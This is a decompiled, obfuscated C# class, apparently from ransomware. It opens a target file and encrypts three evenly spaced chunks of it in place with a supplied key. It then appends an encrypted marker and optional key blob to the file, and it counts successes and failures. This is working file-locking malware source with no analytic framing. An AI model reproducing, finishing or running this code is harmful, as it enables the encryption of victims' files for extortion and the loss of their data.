using System;
using System.IO;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using ygbKLEHbcCFNE;

namespace coxZRmDhvSAWo;

internal sealed class GeksFIyCuYbq
{
	[NonSerialized]
	internal static GetString getString_0;

	public static int zfvsLOKxDdoz(long long_0)
	{
		return (int)long_0;
	}

	public static bool uVsAlcvYzOr(string sWwzrmNOHrjr, string FlamJyhEVvoTOVIU, string RzLPPlGazddiOk, byte[] btlcMmBbizmbR = null, byte[] ulWmpOFlhXqgwE = null)
	{
		try
		{
			using (FileStream fileStream = new FileStream(sWwzrmNOHrjr, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
			{
				int num = zfvsLOKxDdoz(fileStream.Length) / 3;
				if (num < 0)
				{
					num *= -1;
				}
				int num2 = 0;
				try
				{
					num2 = Convert.ToInt32(FlamJyhEVvoTOVIU) * Convert.ToInt32(fileStream.Length) / 100 / 2;
					if (num2 < 0)
					{
						num2 *= -1;
					}
				}
				catch
				{
					num2 = 107374182;
				}
				if (num <= num2 - Convert.ToInt32(FlamJyhEVvoTOVIU) * 1024 * 1024)
				{
					num2 = (num - Convert.ToInt32(FlamJyhEVvoTOVIU) * 1024 * 1024) / 10;
				}
				int cNqbpbzcNfoE = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
				byte[] array = null;
				for (int i = 0; i < 3; i++)
				{
					byte[] byte_ = tmUPDSgJopBN(sWwzrmNOHrjr, fileStream, cNqbpbzcNfoE, num * i);
					array = (GhAMvbuoccW.uBIPmjbCjNt ? sAdFSOOagDt.tbzmVxgbIeuZ(byte_, Convert.FromBase64String(RzLPPlGazddiOk), ulWmpOFlhXqgwE) : NQdDIFAnEzVM.SvtZMRYDytMixf(byte_, Convert.FromBase64String(RzLPPlGazddiOk), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
					RLKQvXdtPNhuWBo(sWwzrmNOHrjr, fileStream, array, num * i);
				}
			}
			byte[] array2 = null;
			array2 = (GhAMvbuoccW.PAOJgADrbjEa ? Encoding.ASCII.GetBytes(GhAMvbuoccW.PbsdnvfpwWRvGCs(getString_0(107399229)) + GhAMvbuoccW.PbsdnvfpwWRvGCs(getString_0(107400238)) + Convert.ToString(FlamJyhEVvoTOVIU) + GhAMvbuoccW.PbsdnvfpwWRvGCs(getString_0(107400238))) : Encoding.ASCII.GetBytes(GhAMvbuoccW.PbsdnvfpwWRvGCs(getString_0(107399229)) + GhAMvbuoccW.PbsdnvfpwWRvGCs(getString_0(107400247)) + Convert.ToString(FlamJyhEVvoTOVIU) + GhAMvbuoccW.PbsdnvfpwWRvGCs(getString_0(107400247))));
			if (!GhAMvbuoccW.PAOJgADrbjEa)
			{
				using FileStream fileStream2 = new FileStream(sWwzrmNOHrjr, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(array2, 0, array2.Length);
			}
			else
			{
				using FileStream fileStream2 = new FileStream(sWwzrmNOHrjr, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(btlcMmBbizmbR, 0, btlcMmBbizmbR.Length);
				fileStream2.Write(array2, 0, array2.Length);
			}
		}
		catch (Exception ex)
		{
			if (GhAMvbuoccW.CCDyMIHlAe)
			{
				try
				{
					File.AppendAllText(GhAMvbuoccW.dtHHyJMWMTcTg, getString_0(107387032) + sWwzrmNOHrjr + getString_0(107399216) + ex.Message + getString_0(107395770));
				}
				catch (Exception)
				{
				}
			}
			GhAMvbuoccW.LVKhJcfUHGhpJNXz++;
			return false;
		}
		GhAMvbuoccW.qXIAEocyZgLqByS++;
		return true;
	}

	public static byte[] tmUPDSgJopBN(string SrtRovWgmRn, FileStream nIgpxCOkjaTzOR, int cNqbpbzcNfoE, int oumwHMpqaKokqf = 0)
	{
		byte[] array = new byte[cNqbpbzcNfoE];
		nIgpxCOkjaTzOR.Position = oumwHMpqaKokqf;
		nIgpxCOkjaTzOR.Read(array, 0, cNqbpbzcNfoE);
		return array;
	}

	public static void RLKQvXdtPNhuWBo(string ubHsHEvjIWVrU, FileStream pCoXSlhcFpFHQAKb, byte[] NfSloiNLiflBY, int SVkQcfzuIqzlj = 0)
	{
		pCoXSlhcFpFHQAKb.Position = SVkQcfzuIqzlj;
		pCoXSlhcFpFHQAKb.Write(NfSloiNLiflBY, 0, NfSloiNLiflBY.Length);
	}

	static GeksFIyCuYbq()
	{
		Strings.CreateGetStringDelegate(typeof(GeksFIyCuYbq));
	}
}
